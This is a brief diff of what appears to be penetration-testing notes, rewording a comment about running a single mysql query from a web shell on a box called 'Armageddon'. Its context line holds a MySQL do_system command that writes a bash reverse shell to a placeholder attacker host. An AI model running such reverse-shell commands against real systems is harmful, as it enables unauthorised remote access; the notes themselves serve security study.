@@ -562,6 +562,6 @@ select do_system('echo ''/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 
 Used in `Armageddon`
 
 ```shell
-# In web shell we need to use full sql command
+# In web shell (non-tty-shell) we need to run a single query from the command line.
 mysql -u "<username>" -h "localhost" "<passowrd>" "<database>" -e "<sql command>"
 ```
